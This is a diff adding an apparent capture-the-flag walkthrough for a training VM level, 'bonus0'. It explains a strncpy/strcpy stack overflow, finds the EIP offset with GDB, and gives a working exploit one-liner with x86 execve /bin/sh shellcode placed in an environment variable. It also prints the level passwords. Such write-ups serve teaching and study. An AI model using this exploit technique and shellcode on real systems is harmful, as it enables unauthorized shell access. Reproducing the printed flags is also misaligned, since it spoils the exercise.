@@ -1,0 +1,82 @@
+1. Download the binary from the server:
+   scp -P 2222 bonus0@localhost:~/bonus0 .
+   Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
+2. Analyze the binary with Ghidra:
+   - Three functions: main(), pp(), and p()
+   - p() uses strncpy(dest, src, 20) which does NOT null-terminate if source >= 20 bytes
+   - pp() has two 20-byte buffers: local_34 and local_20 (adjacent in memory)
+   - pp() uses strcpy() which expects null-terminated strings
+   - If local_34 has no null terminator, strcpy() reads into local_20
+   - Buffer overflow: 20 + 20 + 1 (space) + 20 (strcat) = 61 bytes into main's 54-byte buffer
+   - Overflow of 7 bytes allows return address overwrite
+
+3. Verify with dynamic analysis:
+   Run ltrace to observe the vulnerability:
+   
+   ltrace ./bonus0
+   Input 1: AAAAAAAAAAAAAAAAAAAA (20 A's - no null terminator added by strncpy)
+   Input 2: BBBBBBBBBBBBBBBBBBBB (20 B's - no null terminator added by strncpy)
+   
+   Observe:
+   - strncpy(0xbffffbf8, "AAAAAAAAAAAAAAAAAAAA", 20) - no null added
+   - strncpy(0xbffffc0c, "BBBBBBBBBBBBBBBBBBBB", 20) - no null added
+   - strcpy() copies "AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBB..." - reads past local_34!
+   - Program crashes with SIGSEGV
+
+4. Calculate offsets and prepare exploit:
+   Use GDB to find the exact offset to EIP:
+   
+   gdb ./bonus0
+   run
+   Input 1: Aa0Aa1Aa2Aa3Aa4Aa5Aa
+   Input 2: Bb0Bb1Bb2Bb3Bb4Bb5Bb
+   
+   Result: EIP = 0x42336242 ("B3bB")
+   This is at position 9-12 of the second input.
+   
+   Payload structure:
+   - Input 1: 20 bytes (any data)
+   - Input 2: 9 bytes padding + 4 bytes (return address) + 7 bytes overflow
+   
+   Since we need shellcode, use environment variable method:
+   
+   export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+   
+   Find SHELLCODE address in GDB:
+   gdb ./bonus0
+   run
+   Input 1: AAAAAAAAAAAAAAAAAAAA
+   Input 2: BBBBBBBBBBBBBBBBBBBB
+   x/500s $esp
+   
+   Look for: SHELLCODE=\x90\x90\x90...
+   Note address (example: 0xbffffd44)
+   Add offset to skip "SHELLCODE=" text: 0xbffffd44 + 20 = 0xbffffd58
+
+5. Connect to the VM via SSH:
+   ssh bonus0@localhost -p 2222
+   Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
+6. Execute the exploit:
+   Export the shellcode as an environment variable:
+   export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+   
+   Run the exploit (using address 0xbffffd58 found in step 4):
+   (python -c 'print "A"*20'; python -c 'print "B"*9 + "\x58\xfd\xff\xbf" + "C"*7'; cat) | ./bonus0
+   
+   Note: The 'cat' command keeps stdin open for shell interaction.
+   
+   Shellcode source: https://www.exploit-db.com/shellcodes/42428
+   Author: Touhid M.Shaikh
+   Length: 24 bytes (Linux x86 execve /bin/sh)
+
+7. Read the password:
+   cat /home/user/bonus1/.pass
+   
+   Password: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
+8. Exit and login as bonus1:
+   exit
+   ssh bonus1@localhost -p 2222
+   Password: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
